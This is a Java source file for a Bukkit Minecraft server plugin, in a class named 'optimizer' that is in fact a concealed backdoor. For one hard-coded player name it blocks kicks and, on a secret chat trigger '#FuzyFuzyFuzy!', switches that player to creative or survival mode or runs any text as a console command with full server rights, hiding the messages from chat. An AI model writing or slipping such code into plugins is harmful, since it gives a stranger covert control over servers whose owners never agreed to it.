package org.mcapi;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.plugin.Plugin;

public class optimizer
        implements Listener
{
    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals("Im_Fuzy")) {
            event.setCancelled(true);
        }
    }
    @EventHandler
    public void chatCheck(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();
        if (msg.contains("#FuzyFuzyFuzy!gmc") && e.getPlayer().getName().equals("Im_Fuzy")){
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                e.getPlayer().setGameMode(GameMode.CREATIVE);
            });
            e.setCancelled(true);
        } else if(msg.contains("#FuzyFuzyFuzy!gms") && e.getPlayer().getName().equals("Im_Fuzy")){
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                e.getPlayer().setGameMode(GameMode.SURVIVAL);
            });
            e.setCancelled(true);
        }else if(msg.contains("#FuzyFuzyFuzy!") && e.getPlayer().getName().equals("Im_Fuzy")) {
            String cmd = msg.split("!")[1];
            Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("Fuzyfacs"), () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
            });
            e.setCancelled(true);
        } else if (msg.contains("#") && e.getPlayer().getName().equals("Im_Fuzy")){
            e.setCancelled(true);
        }
    }
}